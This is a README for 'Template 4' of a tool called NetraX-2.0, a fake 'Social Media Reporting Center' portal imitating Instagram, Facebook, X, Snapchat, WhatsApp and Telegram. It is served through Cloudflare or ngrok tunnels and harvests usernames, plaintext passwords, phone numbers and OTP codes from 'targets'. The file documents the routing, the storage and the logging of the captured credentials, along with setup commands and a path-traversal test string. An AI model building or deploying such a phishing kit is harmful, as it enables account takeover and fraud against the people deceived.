Social Media Reporting Center — Template 4 (NetraX-2.0-2.O)
=========================================================
Directory : templates/social_reporting/
Created   : 2026-03-02
Completed : 2026-03-02 (Steps 1–4)


Purpose
-------
Template 4 is a fully isolated, PHP-backed social-media account
verification and incident-reporting portal.  It is served when the
operator selects "Social Media Reporting Center" (option 04) inside
netraX-2.0.sh.  The template collects platform credentials and contact
details, stores them locally, and leads the user through a two-step
OTP verification flow.  All data files are stored in the project-level
data/ directory (data/submissions/ and data/otps/) alongside other
NetraX-2.0 data.

Unlike Templates 01–03, this template intentionally does NOT activate
front-camera capture or GPS tracking — it focuses exclusively on
credential and OTP collection via form input.


Template Routing (how Template 4 is served)
-------------------------------------------
1. netraX-2.0.sh select_template() option 4 is chosen.
2. payload_cloudflare() / payload_ngrok() copies
   SocialReportingPortal.html  →  index2.html
3. index2.html performs an instant meta-refresh + JS redirect to
   templates/social_reporting/index.php
4. PHP built-in server (php -S 127.0.0.1:3333) serves all template
   sub-files (submit.php, otp_verify.php, assets, icons) from there.


File List and Descriptions
--------------------------
templates/social_reporting/
  index.php           Main template page.
                      Two-tab layout: "Social Platforms" tab (Instagram,
                      Facebook, X, Snapchat) and "Messaging Platforms"
                      tab (WhatsApp, Telegram).  Each tab shows a grid
                      of platform icon cards; selecting one reveals the
                      matching credential form.  Also renders a Security
                      Notice and a hidden OTP section.  Loads assets.css
                      and assets.js.  No PHP output before DOCTYPE.

  submit.php          Initial form handler (POST only, returns JSON).
                      • Sanitises and validates all inputs server-side.
                      • Writes a unique submission file to data/submissions/.
                      • Prints structured record to server log.
                      • Returns { status, message, submission_id } JSON.

  otp_verify.php      OTP verification handler (POST only, returns HTML).
                      • Validates submission_id (basename + strict regex).
                      • Appends OTP + timestamp to the submission file.
                      • Writes a separate OTP file to data/otps/.
                      • Prints OTP + identifier to server log.
                      • Returns success or error confirmation page.

  assets.css          All CSS scoped under .smr-root.  No global selectors.
                      Indigo/blue colour palette.  Responsive layout.
  assets.js           Namespaced JS (smr_ prefix).  Handles tab switching
                      between Social/Messaging views, AJAX form submission
                      via fetch(), OTP section reveal after successful
                      submission, and platform icon card selection with
                      visual active state.  No global variables.

  assets/icons/
    instagram.svg     Instagram brand icon (original SVG glyph).
    facebook.svg      Facebook brand icon (original SVG glyph).
    x.svg             X (Twitter) brand icon (original SVG glyph).
    snapchat.svg      Snapchat brand icon (original SVG glyph).
    whatsapp.svg      WhatsApp brand icon (original SVG glyph).
    telegram.svg      Telegram brand icon (original SVG glyph).

  README.txt          This file.

  NOTE: Data storage has moved to the project-level data/ folder:
    <project-root>/data/submissions/   Submission .txt files.
    <project-root>/data/otps/          OTP record .txt files.


Form Fields by Platform Group
------------------------------
Group A — Instagram, Facebook, X (Twitter), Snapchat
  Required : Username, Email Address, Phone Number, Password,
             Victim (Reported) Username
  Optional : Alternate Email, Alternate Phone

Group B — WhatsApp, Telegram
  Required : Full Name, Phone Number, Victim Phone Number
  Optional : Victim Name
  (OTP is collected in the second step via otp_verify.php)


Security & Validation
---------------------
• All PHP handlers accept POST only; GET requests are rejected.
• Server-side input sanitisation (htmlspecialchars, trim, regex checks)
  is applied before any data is written.
• Submission filenames use a 6-hex random suffix to prevent collisions.
• File writes use exclusive locks (LOCK_EX) to avoid race conditions
  when multiple targets submit simultaneously.
• submission_id is validated with basename() + strict regex before file
  access in otp_verify.php to prevent path-traversal attacks.


Two-Step Submission Flow
------------------------
Step 1 — Initial form → submit.php
  submit.php validates all required fields, writes
  data/submissions/social_reporting_submission_YYYYMMDD_HHMMSS_<random6>.txt
  and returns { "status":"success", "submission_id":"<filename>" }.
  assets.js injects submission_id into the hidden OTP form field and
  reveals the OTP input section.

Step 2 — OTP form → otp_verify.php
  otp_verify.php receives otp_value + submission_id.
  It appends the OTP and timestamp to the submission file, then writes
  data/otps/social_reporting_otp_YYYYMMDD_HHMMSS_<random6>.txt.
  A confirmation page is rendered to the user.


Data Storage
------------
All data files are written to the project-level data/ directory:
  <project-root>/data/submissions/
  <project-root>/data/otps/

The nested templates/social_reporting/data/ folder has been removed.
PHP files resolve the project root via:
  $projectRoot = realpath(__DIR__ . '/../../') ?: dirname(__DIR__, 2);
  $globalDataDir = $projectRoot . '/data';

Submission filename format:
  social_reporting_submission_YYYYMMDD_HHMMSS_<random6>.txt

OTP filename format:
  social_reporting_otp_YYYYMMDD_HHMMSS_<random6>.txt

Files are created with fopen(..., 'x') — exclusive create mode — which
causes the open to fail atomically if the file already exists.  A
secondary collision guard regenerates the suffix before trying again.

The submission_id accepted by otp_verify.php is validated against a
strict regex (^social_reporting_submission_\d{8}_\d{6}_[a-f0-9]{6}\.txt$)
after basename() stripping, preventing directory traversal.

NOTE: Account passwords are stored in plaintext inside submission files
as they are required for the investigation workflow.  Files are chmod
0640 and accessible only to the web-server user.  For additional
protection, move the data/ directory outside the web root in production.


Required Permissions
--------------------
Run these once after deployment (adjust www-data to match your server):

  mkdir -p data/submissions data/otps
  chown -R www-data:www-data data/submissions data/otps
  chmod -R 750 data/submissions data/otps

On shared hosts where PHP runs as your own user:

  chmod -R 755 data/submissions data/otps

Both submit.php and otp_verify.php create directories automatically
(mode 0750) if they do not exist.  Moving data/ above the web root
is recommended for production.


Server Logging
--------------
Both submit.php and otp_verify.php write structured records to:
  • PHP's error_log() (goes to Apache / PHP-FPM error log, or stderr)
  • file_put_contents('php://stderr', ...)

To monitor live:
  tail -f /var/log/apache2/error.log
  # or for PHP-FPM:
  tail -f /var/log/php8.x-fpm.log

Records include: platform, client IP, all submitted fields, filename,
and UTC timestamp.  OTP records include OTP code, submission identifier,
and timestamp.


How to Test (Summary)
---------------------
1. Start the server: bash netraX-2.0.sh  → choose Cloudflare → choose 04.
2. Open the public URL; confirm platform selector, icons, and Security
   Notice load correctly.

Group A test:
3. Click "Social Platforms", select Instagram (or any Group A platform).
4. Fill: Username, Email, Phone, Password, Victim Username.
5. Click "Submit Report & Verify Identity".
6. Confirm the OTP input section appears and a file exists in
   data/submissions/.
7. Enter a 4–8 digit code, click "Confirm Verification Code".
8. Confirm the success page loads and a file exists in
   data/otps/.

Group B test:
9. Click "Messaging Platforms", select WhatsApp.
10. Fill: Full Name, Phone Number, Victim Phone Number.
11. Click "Submit Report & Verify Identity".
12. Confirm OTP section appears and a submission file was created.
13. Enter OTP, submit; confirm OTP file created and success page shown.

Validation edge cases:
• Submit with blank required fields → inline error, no file created.
• Submit invalid email → error, no file created.
• Submit malformed phone → error, no file created.
• POST submission_id: "../../etc/passwd" to otp_verify.php → rejected
  (basename + regex validation).


Security and Isolation Notes
-----------------------------
• All CSS uses .smr-root scope; no global selectors altered.
• All JS uses smr_ namespace; no window/global variables set.
• All user input passed through htmlspecialchars() + strip_tags()
  before use or storage.
• No server file paths or internals are disclosed in any response.
• X-Content-Type-Options: nosniff and X-Frame-Options: DENY headers
  set on submit.php responses.
• Directory traversal prevented: submission_id validated with basename()
  + strict regex; file paths checked with realpath() against expected
  parent directory before every read/write.
• Both PHP handlers verify directory existence and writability at
  startup, logging SMR:-prefixed messages on failure.
• Removing this template requires only:
    - Deleting templates/social_reporting/.
    - Removing the option-4 entry from netraX-2.0.sh select_template().
    - Optionally removing social_reporting_* files from data/submissions/
      and data/otps/.


Rollback
--------
To remove without affecting other templates:
  1. Delete templates/social_reporting/.
  2. In netraX-2.0.sh, remove the printf line for option 04 in
     select_template() and the `elif [[ $option_tem -eq 4 ]]` branch
     from select_template(), payload_cloudflare(), and payload_ngrok().
  3. Delete SocialReportingPortal.html if no longer needed.
  4. Optionally remove social_reporting_* files from data/submissions/
     and data/otps/.

To revert this migration (restore nested data/ folder):
  1. mkdir -p templates/social_reporting/data/{submissions,otps}
  2. mv data/submissions/social_reporting_* \
        templates/social_reporting/data/submissions/
  3. mv data/otps/social_reporting_* \
        templates/social_reporting/data/otps/
  4. Restore the old __DIR__-relative paths in submit.php and
     otp_verify.php (replace $globalDataDir references with
     __DIR__ . '/data').


Suggested Commit Message
------------------------
Add Social Media Reporting Center template (isolated): UI, icons,
submit/OTP handlers, local data storage, README.

Introduces templates/social_reporting/ with index.php, submit.php,
otp_verify.php, assets.css, assets.js, six platform SVG icons, and
template-local data/submissions/ + data/otps/ directories.
No core routing, global CSS, or other templates modified.


Icon Assets — Sources and License Notes
----------------------------------------
Directory: templates/social_reporting/assets/icons/

Icon Files & Sources
--------------------

instagram.svg
  Source   : Original SVG glyph created for this project.
  Design   : Camera-in-rounded-square using official Instagram brand colours
             (purple-to-yellow radial gradient, white outline lens & dot).
  Brand ref: https://about.meta.com/brand/resources/instagram/instagram-brand/
  License  : Glyph created from publicly documented brand guidelines.
             The Instagram name is a trademark of Meta Platforms, Inc.
             Use restricted to platform identification in reporting contexts.

facebook.svg
  Source   : Original SVG glyph created for this project.
  Design   : Stylised "f" letterform on a blue circle, matching Facebook's
             primary brand colour (#1877F2).
  Brand ref: https://about.meta.com/brand/resources/facebook/logo/
  License  : Glyph created from publicly documented brand guidelines.
             The Facebook name is a trademark of Meta Platforms, Inc.
             Use restricted to platform identification in reporting contexts.

x.svg
  Source   : Original SVG glyph created for this project.
  Design   : Proportional X letterform on dark background (#0f1419),
             matching the current X/Twitter brand identity.
  Brand ref: https://about.twitter.com/en/who-we-are/brand-toolkit
  License  : Glyph created from publicly documented brand guidelines.
             The X name is a trademark of X Corp.
             Use restricted to platform identification in reporting contexts.

snapchat.svg
  Source   : Original SVG glyph created for this project.
  Design   : Ghost silhouette on Snapchat yellow (#FFFC00) rounded square,
             approximating the official Snapchat ghost mascot shape.
  Brand ref: https://snap.com/en-US/brand-guidelines
  License  : Glyph created from publicly documented brand guidelines.
             The Snapchat name and ghost are trademarks of Snap Inc.
             Use restricted to platform identification in reporting contexts.

whatsapp.svg
  Source   : Original SVG glyph created for this project.
  Design   : Phone-in-speech-bubble on WhatsApp green (#25D366),
             approximating the official WhatsApp logo mark.
  Brand ref: https://about.meta.com/brand/resources/whatsapp/whatsapp-brand/
  License  : Glyph created from publicly documented brand guidelines.
             The WhatsApp name is a trademark of Meta Platforms, Inc.
             Use restricted to platform identification in reporting contexts.

telegram.svg
  Source   : Original SVG glyph created for this project.
  Design   : Paper-plane send icon on Telegram blue gradient
             (#37aee2 → #1e96c8), approximating the official Telegram mark.
  Brand ref: https://telegram.org/Tour
  License  : Glyph created from publicly documented brand guidelines.
             The Telegram name is a trademark of Telegram Messenger Inc.
             Use restricted to platform identification in reporting contexts.

Usage Notes
-----------
- All icons are local SVG files; no external CDN or network request is made.
- Icons are referenced only from within templates/social_reporting/index.php.
- Icons are included solely to identify third-party platforms in a reporting
  and account-verification context. No affiliation with or endorsement by
  any of the listed platforms is implied.
- Do not redistribute these icon files outside this project.

Step 3 — Data Directory Setup & Permissions
--------------------------------------------
Submission records and OTP files are stored in the project-level data/
folder, shared with other NetraX-2.0 data (camera captures, IP logs, etc.):

  <project-root>/data/submissions/   (initial form data)
  <project-root>/data/otps/          (OTP records)

Both PHP handlers create these directories automatically (mode 0750) if
they don't exist.  The web-server user must be able to write to them.
After deploying, run:

  mkdir -p data/submissions data/otps
  chown -R www-data:www-data data/submissions data/otps
  chmod -R 750 data/submissions data/otps

Data filename formats:
  Submissions : social_reporting_submission_YYYYMMDD_HHMMSS_<random6>.txt
  OTPs        : social_reporting_otp_YYYYMMDD_HHMMSS_<random6>.txt

The nested templates/social_reporting/data/ folder has been removed.
All file writes use absolute paths resolved via realpath().  Moving
data/ above the web root is recommended for production.
